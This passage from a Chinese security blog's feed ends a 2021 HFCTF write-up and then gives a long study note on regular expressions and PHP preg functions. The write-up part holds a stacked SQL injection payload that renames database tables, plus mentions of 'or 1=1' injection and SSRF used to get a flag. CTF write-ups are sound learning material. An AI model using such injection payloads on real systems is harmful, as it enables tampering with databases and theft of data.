class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1;use ctf2;RENAME TABLE `fake_admin` TO `fake_admin1`;RENAME TABLE</span></span><br><span class="line"><span class="string">`real_admin_here_do_you_find` TO `fake_admin`; --</span></span><br></pre></td></tr></table></figure><p>然后用 ‘or 1=1 注入查密码</p><p>最后ssrf看admin.php出flag</p><p>查的用户名是admin_inner最后用的是admin也是没谁了</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="你会日志吗？"><a href="#你会日志吗？" class="headerlink" title="你会日志吗？"></a>你会日志吗？</h2><p>时间盲注的日志，找377然后ASSIC转，发现是base64 ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==</p><p>解码出flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021hfctf-wp&quot;&gt;&lt;a href=&quot;#2021hfctf-wp&quot; class=&quot;headerlink&quot; title=&quot;2021hfctf wp&quot;&gt;&lt;/a&gt;2021hfctf wp&lt;/h1&gt;&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="web" scheme="http://www.fxizenta.design/categories/ctf/web/"/>
    
    
    <category term="wp" scheme="http://www.fxizenta.design/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式学习总结</title>
    <link href="http://www.fxizenta.design/2021/03/06/regular_expression/"/>
    <id>http://www.fxizenta.design/2021/03/06/regular_expression/</id>
    <published>2021-03-06T04:24:46.000Z</published>
    <updated>2021-07-23T09:08:46.637Z</updated>
    
    <content type="html"><![CDATA[<p>起因是最近做一道文件包含的ctf题目时，卡了很久，最后才发现是对正则表达式的理解有问题导致，害，太菜了，最后反思了一下还是没有好好学习正则表达式（尤其是没有系统的进行学习），于是决定系统的学习一下正则表达式。</p><p>本次学习使用的学习资料为《精通正则表达式(第三版)》。内容主要为正则表达式基础和本人比较常遇到PHP环境下的正则表达式。</p><h1 id="正则表达式基础"><a href="#正则表达式基础" class="headerlink" title="正则表达式基础"></a>正则表达式基础</h1><p>正则表达式由两种字符构成，<strong>元字符</strong>和<strong>文字,元字符</strong>为高级应用提供了丰富而且描述力极强。</p><h2 id="行的起始和结束"><a href="#行的起始和结束" class="headerlink" title="行的起始和结束"></a>行的起始和结束</h2><p>^ 表示一行的开始</p><p>$  表示一行的结束</p><p>^aa 匹配以aa开头的行</p><p>^$  行开头接行末尾</p><p>^aa$ 一行内容为aa的行</p><h2 id="字符组"><a href="#字符组" class="headerlink" title="字符组"></a>字符组</h2><p>匹配若干字符之一</p><p><strong>同样的字符在字符组内和组外含义不同</strong></p><h3 id="连字符"><a href="#连字符" class="headerlink" title="连字符"></a>连字符</h3><p>‘-’连字符，表示一个范围(仅在<strong>字符组内部且不在开头</strong>连字符才是元字符）</p><p>例如：</p><p><H[1-6]>与<H[123456]>是相同的</p><p>多重范围同样的允许的</p><p>例如：</p><p>[0-9A-Za-z]</p><h3 id="排除型字符组"><a href="#排除型字符组" class="headerlink" title="排除型字符组"></a>排除型字符组</h3><p>^表示排除，后面表示不希望匹配的字符</p><p>例如:</p><p><sup><a href="#fn_1-6" id="reffn_1-6">1-6</a></sup> 匹配除了1到6以外的任何字符</p><h2 id="用点号匹配任意字符"><a href="#用点号匹配任意字符" class="headerlink" title="用点号匹配任意字符"></a>用点号匹配任意字符</h2><p>元字符.是用来匹配任意字符的字符组的简便写法，<strong>注意仅在字符组外为元字符</strong></p><p>例如：</p><p>11.11</p><p>可以匹配11-11,11.11,11/11等</p><h2 id="多选结构"><a href="#多选结构" class="headerlink" title="多选结构"></a>多选结构</h2><p>‘|’或，简单易懂就是匹配表达式中的一个表达式</p><p>例如：</p><p>c(a|e)t 即可匹配cat也可以匹配cet</p><p>表达式前加上(?i)可以忽视大小写</p><h2 id="单词分界线"><a href="#单词分界线" class="headerlink" title="单词分界线"></a>单词分界线</h2><p>\&lt; 用于匹配单词的开始位置</p><p>> 用于匹配单词的结束位置</p><p>可以想象成单词版本的^和$</p><p>两者可以一起使用用于匹配单词也可以只使用一个用于匹配某个字符串开始或结束的单词</p><p>\b 用于字符串开始或结尾进行匹配</p><p>m/\bjack/ 可匹配jack开头的所有字符串</p><p>m/jack\b/ 可匹配jack结尾的所有字符串</p><p> m/\bjack\b/ 只能匹配jack</p><h2 id="可选项元素"><a href="#可选项元素" class="headerlink" title="可选项元素"></a>可选项元素</h2><p>?表示可选项</p><p>例如</p><p>jkk? 可以匹配jk和jkk</p><p>+表示之前邻接的元素出现<strong>一次或多次</strong></p><p>例如</p><p>jk+ 可以匹配jkkkkkkkk、jk、jkkkk</p><p><em>则是匹配任意次数，<em>*包括0次</em></em></p><p>jk*  可以匹配j、jk、jkkkkkk</p><p><img src="https://i.loli.net/2021/03/06/OG2C3zYB4nFrDiQ.png" alt="Untitled.png"></p><p><strong>贪婪</strong>：指尽可能的匹配出最长的内容</p><p><strong>非贪婪</strong>：匹配出最短的内容</p><p>而*和+都是贪婪的，它们都会尽可能多的匹配文字。</p><p>只要在它们的后面加上一个？就可以实现非贪婪即最小匹配</p><p>例如：</p><p>&lt;..&gt;head&lt;..&gt;</p><p>/&lt;.*&gt;/    匹配结果为&lt;..&gt;head&lt;..&gt;</p><p>/&lt;.*?&gt;/   匹配结果为&lt;..&gt;</p><p>区间量词</p><p>{min,max}</p><p>上述三个元符号可以等价于以下量词</p><p><img src="https://i.loli.net/2021/03/06/i6GkxBnu3bMXJL9.png" alt="Untitled 1.png"></p><h2 id="括号以及反向引用"><a href="#括号以及反向引用" class="headerlink" title="括号以及反向引用"></a>括号以及反向引用</h2><p>括号除了将若干字符组合为一个单元，还有一个作用就是可以记录它们包含的子表达式匹配的文本。</p><p>\1匹配第一个括号内匹配的内容，\2匹配第二个括号匹配的内容，如此类推</p><p>例如：</p><p>\&lt;([A-Za-z]+) +\1> 匹配两个连续重复的单词</p><h2 id="非捕获型括号"><a href="#非捕获型括号" class="headerlink" title="非捕获型括号"></a>非捕获型括号</h2><p>(?:)表示这个括号只进行分组而不捕获，即也不会影响捕获计数，即仅用于分组的括号</p><h2 id="命名捕获"><a href="#命名捕获" class="headerlink" title="命名捕获"></a>命名捕获</h2><p>在python和php中，可以对捕获内容进行命名，语法相同，都是(?P<name>..)</p><p>例如：</p><p>\b(?P<Area>\d\d\d)</p><h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><p>如果需要匹配的某个字符本身就是元字符，应该如何处理呢？</p><p>例如.本身就是元字符，在我们需要匹配一个网址时，我们可以这样写</p><p>www.baidu.com</p><p>或者匹配一个括号包含字符</p><p>([a-zA-Z]+)</p><h2 id="主要流派的正则表达式的部分简记法"><a href="#主要流派的正则表达式的部分简记法" class="headerlink" title="主要流派的正则表达式的部分简记法"></a>主要流派的正则表达式的部分简记法</h2><p>\s  匹配所有空白字符</p><p>\n  换行符</p><p>\r   回车符</p><p>\t   制表符</p><p>\S  除’\s’外的所有内容</p><p>\w  等价于[a-zA-Z0-9] </p><p>\W 除’\w’外的任何字符</p><p>\d  等价于[0-9]，即数字</p><p>\D  除’\d’外的任何字符</p><p>/i修饰符表示此测试区不区分大小写，注意：虽然写法是’/i’,但其实“i”只是跟在表示结尾的斜线之后</p><p>m/../ 匹配</p><p>s/../../ 匹配并替换</p><h2 id="环视结构"><a href="#环视结构" class="headerlink" title="环视结构"></a>环视结构</h2><h3 id="顺序环视"><a href="#顺序环视" class="headerlink" title="顺序环视"></a>顺序环视</h3><p>用(?=…)来表示</p><p>例如</p><p>(?=\d),表示如果当前位置右边的字符是数字则匹配成功</p><h3 id="逆序环视"><a href="#逆序环视" class="headerlink" title="逆序环视"></a>逆序环视</h3><p>用(?&lt;=….)表示</p><p>例如(?&lt;=\d),表示如果当前位置左边有一位数字则匹配成功（即紧跟在数字后面的位置）</p><p>即逆序的查看（从右向左）文本进行匹配</p><h3 id="否定顺序环视"><a href="#否定顺序环视" class="headerlink" title="否定顺序环视"></a>否定顺序环视</h3><p>(?!……) 不能匹配右侧的文本，即位置右侧不能是指定的文本</p><h3 id="否定逆序环视"><a href="#否定逆序环视" class="headerlink" title="否定逆序环视"></a>否定逆序环视</h3><p>(?&lt;!…)同上，只是改为不能匹配左侧的文本</p><h3 id="环视不会“占用”字符"><a href="#环视不会“占用”字符" class="headerlink" title="环视不会“占用”字符"></a>环视不会“占用”字符</h3><p>理解比较困难，这里直接使用实例</p><p>文本如下</p><p>hello Miss Alice.</p><p>下面用’’包裹匹配的内容来表示匹配的内容</p><p>Miss  匹配 hello ‘Miss’ Alice</p><p>(?=Miss) 匹配 hello ‘’Miss Alice</p><p>即Miss前面的位置，因为符合右边邻接Miss（即在Miss的前面）</p><p>(?=Miss)Mis 匹配hello ‘Mis’s Alice</p><p>(?=Miss)Mis 等价于 Mis(?=s)</p><p>s/../../g 全局替换</p><p>/m 多行查找（导致题目卡住的罪魁祸首~）</p><p>m 主要影响 ^、$。</p><p>若不指定 m，则：^ 只在字符串的最开头，$ 只在字符串的最结尾。即：匹配整个串的开始和结束</p><p>若指定 m，则：^ 在字符串每一行的开头，$ 在字符串每一行的结尾。即：匹配每一行的开始和结束</p><p>注意：在不同流派不同语言中正则表达式的格式存在细微区别</p><h2 id="进制转义"><a href="#进制转义" class="headerlink" title="进制转义"></a>进制转义</h2><h3 id="8进制转义"><a href="#8进制转义" class="headerlink" title="8进制转义"></a>8进制转义</h3><p>\num</p><p>转义为ASCII中数字所代表的字符</p><h3 id="16进制-Unicode转义"><a href="#16进制-Unicode转义" class="headerlink" title="16进制/Unicode转义"></a>16进制/Unicode转义</h3><p>\xnum  \x(num) \unum \Unum</p><h3 id="控制字符"><a href="#控制字符" class="headerlink" title="控制字符"></a>控制字符</h3><p>\cchar用于匹配小于32的控制字符（有些支持匹配更大的值）</p><h3 id="x"><a href="#x" class="headerlink" title="\x"></a>\x</h3><p>同时\x在php中被视为\P{M}|p{M}*的缩略表示，也可以看作点号的扩展</p><p>\x与点号的区别</p><p>1.\x能够匹配结尾的组合字符之外</p><ol><li><p>\x能够匹配换行符和其他在Unicode行终结符</p></li><li><p>点号通配模式下的点号无论什么情况下都能匹配任何字符，而\x不能匹配以组合字符开头的字符</p></li></ol><p>关于基本字符和组合字符可以自行搜索Unicode体系了解</p><h2 id="Unicode的字符性质"><a href="#Unicode的字符性质" class="headerlink" title="Unicode的字符性质"></a>Unicode的字符性质</h2><p>Unicode不仅仅是一套字符映射规则，同时Unicode标准还定义了每一个字符的性质，例如“这个字符是标记字符（mark），它必须和其他字符一起使用”、“ 这个字符是小写字符”</p><p>等。</p><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>不同的正则表达式系统对于这些属性的支持也不同，但是许多支持Unicode的程序能够通过\p(quality)并支持其中的一部分</p><p>\Pxx则匹配不具有对应属性的字符(等价于<sup><a href="#fn_\p{xx}" id="reffn_\p{xx}">\p{xx}</a></sup></p><p>基本的Unicode属性分类如下</p><p>\p{L}       \p{letter}字母</p><p>\p{M}     \p{Mark}不能单独出现，必须和其他基本字符一起出现（例如：重音符号）的字符</p><p>\p{Z}      \p{Separator}用于表示分隔，但本身不可见的字符</p><p>\p{S}      \p{Symbol}各种图形符号和字母符号</p><p>\p{N}     \p{Number}任何数字</p><p>\p{P}      \p{Punctuation}标点字符</p><p>\p{C}      \p{Other}匹配其他任何字符（很少用于正常字符）</p><p>注意：在部分系统中单字母属性可能不需要花括号(例如：\pL而不是\p{L}</p><p>同时每个属性又包含若干的子属性，子属性还可以以某些实现方式支持的特殊形式实现复合</p><p>例如：\p{L&amp;}等价于[\p{Lu}\p{Ll}\p{Lt}]</p><p>基本子属性如下：</p><p><img src="https://i.loli.net/2021/03/06/6Jg8HAtn7MkKhDo.png" alt="Untitled 2.png"></p><h3 id="字母表"><a href="#字母表" class="headerlink" title="字母表"></a>字母表</h3><p>部分系统能够按照字母表的名字以\p{…}的格式进行匹配，例如\p{Hebrew}匹配希伯来文独有的字符(不包含在其他书写系统中也常见的字符例如逗号）</p><p>部分字母表是基于语言的如泰国语，切罗基语等，</p><p>有的则包含多种语言，如拉丁文，有些语言包甚至包含多种字母表，例如日语的字符就有部分来自汉语、拉丁语等。具体请查看对应的文档。</p><p>注意：字母表只包含独属于（严格来说应该是几乎独属于，例如上文提到的日语），而不是特定书写系统的所有字符。而常见的字符则是通属于叫IsCommon的字符表，使用{IsCommon}来进行匹配。</p><p>扩展：还有一个伪字符表Inherited它包括从其所属的字符表中的基本字符继承而来的组合字符。</p><h3 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h3><p>区块类似但小于字母表（或者说是低配版的字母表)，区块表示Unicode字符映射表中一定范围内的代码点。</p><p>例如Tibetan区块表示的是从U+0F00到U+0FFF的256个代码点。其中的字符可以用\p{InTibetan}来匹配.</p><p>为什么是低配版的字母表的原因如下：</p><p>1.区块可能包含没有赋值的代码点，例如在Tibetan区块中就有25%的代码点没有分配</p><p>2.并不像字母表那样，所有看上去和区块内的字符相关的字符都在区块内的</p><p>3.区块内也常常包含和区块不相干的字符，例如人民币符号￥在Latin_1_Supplement区块</p><p>4.区块是相互交叉的，即某个字母表的字符可能同时被包含于多个区块。例如希腊字母同时出现在Greek和Greek_Extended 区块中</p><p>但是对于区块的支持比字母表更加普遍</p><p>比较常见的系统支持如下：</p><p><img src="https://i.loli.net/2021/03/06/QdeSxN1DKuTAwH6.png" alt="Untitled 3.png"></p><h2 id="字符组运算"><a href="#字符组运算" class="headerlink" title="字符组运算"></a>字符组运算</h2><h3 id="减号（-）"><a href="#减号（-）" class="headerlink" title="减号（-）"></a>减号（-）</h3><p>直接用实例说明</p><p>例如</p><p>[[a-z]-[aeiou]]</p><p>匹配的字符就是[a-z]能够匹配字符的减去[aeiou]能够匹配的字符</p><p>也即除了元音字母以外的字母</p><p>[\p{P}-[\p{Ps}\p{Pe}] ]</p><p>匹配\p{Ps}中除了[\p{Ps}\p{Pe}]外的字符</p><p>即匹配除了{和]之类成对的符号以外的所有标点符号。</p><h3 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h3><p>这个或上文有所提及的‘|“不同这里千万不要弄混了，在字符组中OR更像是一种简记法，用于以字符组的方式来先字符组中添加字符，更多时候用于排除型字符组中。</p><p>例如[abcxyz]等价于[ [abc] [xyz] ]、[ [abc]xyz]等等</p><h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>AND对两个集合进行与运算</p><p>例如[\p{InThai}&amp;&amp;\P{Cn}]</p><p>对\p{InThai}和\P{Cn}进行交运算</p><p>注意第二个P是大写即匹配不具有此属性的字符</p><p>也即\P{Cn}等价于<sup><a href="#fn_\p{Cn}" id="reffn_\p{Cn}">\p{Cn}</a></sup></p><h3 id="锚点及其他”零长度断言“"><a href="#锚点及其他”零长度断言“" class="headerlink" title="锚点及其他”零长度断言“"></a>锚点及其他”零长度断言“</h3><p>锚点及其他”零长度断言“并不匹配文本内容，而是寻找文本中的位置。</p><p>具体可参考下表</p><p><img src="https://i.loli.net/2021/03/06/B9mAOtjSZw7RMce.png" alt="Untitled 4.png"></p><p>\G 用于匹配起始位置（或者是上一次匹配的结束位置）</p><h2 id="模式修饰符（-modifier"><a href="#模式修饰符（-modifier" class="headerlink" title="模式修饰符（?modifier)"></a>模式修饰符（?modifier)</h2><p>常见的模式修饰符字母</p><p><img src="https://i.loli.net/2021/03/06/sV43tXduPIaOnMS.png" alt="Untitled 5.png"></p><p>作用范围</p><p>(?:(?i)very)可化简为：</p><p>(?i:…..)表示在括号内有效</p><p>注意：python支持第一种即(?i)格式</p><p>但是不支持(?i:…)格式</p><h2 id="注释-…-和-…"><a href="#注释-…-和-…" class="headerlink" title="注释(?#…)和#…"></a>注释(?#…)和#…</h2><p>很少用到和见到，了解一下就ok了</p><h2 id="固化分组-（-gt-…"><a href="#固化分组-（-gt-…" class="headerlink" title="固化分组 （?&gt;…)"></a>固化分组 （?&gt;…)</h2><p>一旦括号内的子表达式匹配之后，匹配的内容就固定下来无法修改，并且在接下来的匹配过程中不会变化，除非整个固化分组的括号都被弃用。</p><p>例如：</p><p>文本为hello!</p><p>.*!是可以进行匹配的</p><p>而(?&gt;.*)! 是无法被匹配的</p><p>因为在固化分组中hello!已经被.*所匹配且无法再被改变，所以没有!来匹配后面的那个!了</p><h2 id="文字文本范围：-Q…-E"><a href="#文字文本范围：-Q…-E" class="headerlink" title="文字文本范围：\Q…\E"></a>文字文本范围：\Q…\E</h2><p>消除\E以外所有元字符的特殊含义，如果没有\E则一直作用到正则表达式末端。</p><p>即在\Q到\E的范围内，所有字符都被当做文本，元字符也不需要在前面加上\来说明用作字符了</p><h2 id="忽略优先量词：-num-num"><a href="#忽略优先量词：-num-num" class="headerlink" title="忽略优先量词：*? , +? , ?? , {num,num}?"></a>忽略优先量词：*? , +? , ?? , {num,num}?</h2><p>如果不确定是否要匹配，忽略优先量词会选择”不匹配”的状态，再尝试表达式中之后的元素，如果尝试失败，再回溯，选择之前保存的”匹配”的状态。</p><p>对[\s\S]<em>来说</em>，把<em>*改为</em>?就是使用了忽略优先量词，<em>?限定的元素出现次数范围与</em>完全一样，都表示”可能出现，也可能不出现，出现次数没有上限”。区别在于，在实际匹配过程中，遇到[\s\S]能匹配的字符，先尝试”忽略”，如果后面的元素不能匹配，再尝试”匹配”，就如名字一样优先忽略出现的匹配结果</p><p>注意忽略优先量词和匹配优先量词本身在匹配次数上是没有区别的，例如<em>和</em>？的区间还都是[0,∞]，<strong>区别在于，忽略优先量词会优先选择”忽略”，而匹配优先量词会优先选择”匹配”。</strong></p><h2 id="占有优先量词：-num-num"><a href="#占有优先量词：-num-num" class="headerlink" title="占有优先量词：*+ , ++ , ?+ , (num,num)+"></a>占有优先量词：*+ , ++ , ?+ , (num,num)+</h2><p>占有优先量词类似于普通的匹配优先量词，不过他们一旦匹配某些内容就不会”交还“，类似于固化分组</p><h1 id="PHP环境下的正则"><a href="#PHP环境下的正则" class="headerlink" title="PHP环境下的正则"></a>PHP环境下的正则</h1><p>下面主要讨论的是preg引擎下提供的函数</p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>preg引擎的一些说明</p><p>1.\b在字符组内部才表示退格符，在其他场合\b表示单词分界符</p><p>\0匹配空字节</p><p>2.单词分界符和字符简记法，例如\w,\s只对ASCII字符起作用（即使是在UTF-8模式下），如果要处理Unicode字符，可以用\pL代替\w,</p><p>\pN代替\d, \pZ代替\s</p><p>3.在PHP里，Unicode的字母表不需要类似于’Is’或者’ In’这样的前缀，而且属性不支持长名称，例如只能写作\pL，不支持\p{Letter}</p><p>PHP支持<strong>\p{L&amp;}</strong>(等价于[\p{Lu}\p{Ll}\p{Lt}])<strong>和\p{Any}</strong>(表示任意字符）</p><p>4.默认情况下preg的正则表达式是以字节为单位的，所以\C等价于(?s:.),不过如果使用了修饰符u,preg就会自动变为以UTF-8字母为单位，即一个字符最多可能6个字节组成。但是\C仍匹配单个字节</p><p>5.\z和\Z都可以匹配字符串的末尾，\Z同样能够匹配最好的换行符</p><p>而$(匹配行末）的意义则会随着模式修饰符变化（m和D），</p><p>在没有设定任何修饰符时$等价于\Z</p><p>如果使用了m，则它可以匹配内嵌的换行符（那道题的解题关键）</p><p>如果使用了模式修饰符D，它能够匹配\z（只有在字符串的结尾）</p><p>如果同时设置了m和D则视为m</p><p>6.逆序环视结构使用的子表达式只能匹配固定长度的文本，除非顶层多选分支容许不同的固定长度</p><p>7.模式修饰符x（自由格式和注释）只能识别ASCII的空白字符，不能识别Unicode中的空白字符。</p><h2 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h2><p>preg要求正则表达式两侧必须要有分隔符，常见的做法是把斜线作为分隔符（注意我们可以使用除字母、数字、反斜线和空白字符外的任意ASCII字符做风格符），常见的是一对斜线，也有使用!和#作为分隔符的</p><h2 id="PHP特有的修饰符"><a href="#PHP特有的修饰符" class="headerlink" title="PHP特有的修饰符"></a>PHP特有的修饰符</h2><p>除四种标准修饰符里的模式修饰符外(i、s、m、x)</p><p>修饰符e只用于preg_replace,具体可以看函数preg_replace部分</p><h3 id="模式修饰符u"><a href="#模式修饰符u" class="headerlink" title="模式修饰符u"></a>模式修饰符u</h3><p>以utf-8编码处理正则表达式和目标字符串，此模式不会修改数据，只是更改处理数据的方式，在utf-8编码中，非ASCII字符以多个字节来储存，使用u修饰符能够确保多个字节会作为单个字符来处理。</p><h3 id="模式修饰符X"><a href="#模式修饰符X" class="headerlink" title="模式修饰符X"></a>模式修饰符X</h3><p>启动PCRE的额外功能，目前它只有一个效果，如果出现了无法识别的反斜线，就报告错误。例如，默认情况下，\k在PCRE中没有特殊意义，正常情况下会被看作k，如果使用了模式修饰符X，就会报告’unrecognized character follows  \”</p><h3 id="模式修饰符S"><a href="#模式修饰符S" class="headerlink" title="模式修饰符S"></a>模式修饰符S</h3><p>调用PCRE的研究(study)特性，预先分析正则表达式，在某些顺利情况下，在尝试匹配时速度会大大提升。</p><h3 id="不常用的模式修饰符"><a href="#不常用的模式修饰符" class="headerlink" title="不常用的模式修饰符"></a>不常用的模式修饰符</h3><p>模式修饰符A 把匹配锚定再第一次尝试的位置，就等于整个正则表达式以\G开头</p><p>模式修饰符D 会把每个$替换成\z，即$匹配字符串的末尾，而不是字符串之内的换行符</p><p>模式修饰符U交换元字符的匹配优先含义：<em>和</em>?交换，（完全不知道这个是拿来干什么的，感觉一点用都没有）</p><h2 id="Preg函数"><a href="#Preg函数" class="headerlink" title="Preg函数"></a>Preg函数</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h3><p>preg_match(pattern,subject[,matches[,flags[,offset]]])</p><p>测试正则表达式能否在字符串中找到匹配，并提取数据</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>subjuct 需要进行搜索的目标字符串</p><p>matches 非必要，用来接受匹配数据</p><p>flags 非必要，此标志位会影响整个函数的行为，这里只容许出现一个标志位</p><p>offset 非必要，从0开始，表示开始匹配的位置</p><p><strong>返回值</strong></p><p>成功匹配返回true否则返回false</p><h3 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all"></a>preg_match_all</h3><p>preg_match_all(pattern,subject,matches[,flags[,offset]])</p><p>在字符串中提取数据</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>subjuct 需要进行搜索的目标字符串</p><p>matches 必要，用来接受匹配数据（和preg_match不同的地方）</p><p>flags 非必要，此标志位会影响整个函数的行为，这里只容许出现一个标志位</p><p>offset 非必要，从0开始，表示开始匹配的位置</p><p><strong>返回值</strong></p><p>preg_match_all返回匹配的次数</p><p>preg_match_all可以以两种方式在$all_matches中存放数据，由参数flag决定</p><p>flag:PREG_PATTERN_ORDER或是PREG_SET_ORDER来决定</p><p>默认的排列方式是PREG_PATTERN_ORDER</p><p>下面是书中的例子</p><p><img src="https://i.loli.net/2021/03/06/F3LmndhNDg4U1BZ.png" alt="Untitled 6.png"></p><p>而如果使用PREG_SET_ORDER则会返回下面这个数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>( <span class="number">0</span> =&gt; <span class="string">&quot;Jack A. Smith&quot;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&quot;Jack&quot;</span>,</span><br><span class="line"><span class="number">2</span> =&gt; <span class="string">&quot;A.&quot;</span>,</span><br><span class="line"><span class="number">3</span> =&gt; <span class="string">&quot;Smith&quot;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="string">&quot;Mary B. Miller&quot;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&quot;Mary&quot;</span>,</span><br><span class="line"><span class="number">2</span> =&gt; <span class="string">&quot;B.&quot;</span>,</span><br><span class="line"><span class="number">3</span> =&gt; <span class="string">&quot;Miller&quot;</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p>preg_replace(pattern,replacement,subject[,limit[,count]]}</p><p>在字符串的副本中替换匹配的文本</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>replacement replacement字符串，如果pattern是一个数组，则replacement是包含多个子符 串的数组，如果使用了模式修饰符e，则字符串会被当作php代码</p><p>subjuct 需要进行替换的目标字符串，也可以是数组</p><p>limit 非必要，是一个整数，表示替换发生的上限</p><p>count 非必要，用来保存实际进行的替换次数（只有php5提供）</p><p><strong>返回值</strong></p><p>当subject是单个字符时，则返回一个字符串（subject可能被修改后的副本）</p><p>当subject是数组时则返回数组</p><p>Pattern和replacement可以以(字符串、字符串) (数组，字符串) (字符串，数组)</p><p>如果使用了模式修饰符e，replacement字符串的捕获引用会按照特殊的规定来插值：插值中的引号（单引号和双引号）会转义。如果不这样处理，插入的数值中的引号会让PHP代码出错。</p><h3 id="preg-replace-callback"><a href="#preg-replace-callback" class="headerlink" title="preg_replace_callback"></a>preg_replace_callback</h3><p>preg_replace_callback(pattern,callback,subject[,limit[,count]])</p><p>对字符串中的每处匹配文本调用处理函数</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>callback PHP回调函数，每次匹配成功，就执行它，生成replacement字符串</p><p>subjuct 需要进行替换的目标字符串，也可以是数组</p><p>limit 非必要，是一个整数，表示替换发生的上限</p><p>count 非必要，用来保存实际进行的替换次数（只有php5提供）</p><p><strong>返回值</strong></p><p>当subject是单个字符时，则返回一个字符串（subject可能被修改后的副本）</p><p>当subject是数组时则返回数组</p><h3 id="preg-split"><a href="#preg-split" class="headerlink" title="preg_split"></a>preg_split</h3><p>preg_split(pattern,subject[,limit,[flags]])</p><p>将字符串切分为子串数组</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>subjuct 需要进行分割的目标字符串</p><p>limit 非必要，是一个整数，表示切分之后元素的上限</p><p>flags 非必要，此标志位会影响整个函数的行为，以下三种可以随意组合</p><p>PREG_SPLIT_NO_EMPLY</p><p>PREG_SPLIT_DELIM_CAPTURE</p><p>PREG_SPLIT_OFFSET_CAPTURE</p><p><strong>返回值</strong></p><p>返回一个字符串数组</p><p><strong>flag参数</strong></p><p>三个标志位都会影响函数的功能，它们可以单独使用，也可以用or连接</p><p>PREG_SPLIT_OFFSET_CAPTURE</p><p>类似于preg_match_all中的PREG_OFFSET_CAPTURE，这个标志位会修改结果数组，把每个元素变为包含两个元素的数组</p><p>PREG_SPLIT_NO_EMPLY</p><p>这个标志位设定后preg_split会忽略空字符串，不把它们放在返回数组中，也不计入limit的统计中。</p><p>PREG_SPLIT_DELIM_CAPTURE</p><p>这个标志位在结果中包含匹配的文本，以及进行此次切分的正则表达式的捕获括号匹配的文本，下面用例子说明</p><p>字符串如下，而且是用or和and来连接的</p><p>DLSR camera and Nikon D200 or Canon EOS 30D</p><p>在不使用PREG_SPLIT_DELIM_CAPTURE的情况下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_split(<span class="string">&#x27;/\s+ (and|or) \s+ /x&#x27;</span>,<span class="variable">$input</span>);</span><br></pre></td></tr></table></figure><p>结果是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&quot;DLSR camera&#x27;,&#x27;Nikon D200&#x27;,&#x27;Canon EOS 30D&#x27;)</span></span><br></pre></td></tr></table></figure><p>分隔符内容被去掉了，但是如果使用了PREG_SPLIT_DELIM_CAPTURE呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_split(<span class="string">&#x27;/\s+ (and|or) \s+ /x&#x27;</span>,<span class="variable">$input</span>,<span class="number">-1</span>,PREG_SPLIT_DELIM_CAPTURE);</span><br></pre></td></tr></table></figure><p>结果如下，即分隔符也被包括进去了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;DLSR camera&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;Nikon D200&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;Canon EOS 30D&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="prep-grep"><a href="#prep-grep" class="headerlink" title="prep_grep"></a>prep_grep</h3><p>preg_grep(pattern,input[,flags])</p><p>选出数组中能（不能）由表达式匹配的元素</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>input 